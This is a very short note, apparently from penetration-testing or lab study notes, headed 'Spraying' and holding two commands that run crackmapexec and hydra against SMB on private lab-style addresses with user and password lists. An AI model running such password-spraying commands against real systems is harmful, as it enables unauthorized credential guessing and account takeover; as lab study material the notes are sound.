# Spraying

```
crackmapexec smb 10.10.10.172 -u userlist.txt -p passlist
hydra -L userlist.txt -P passlist.txt 10.10.10.193 smb
```

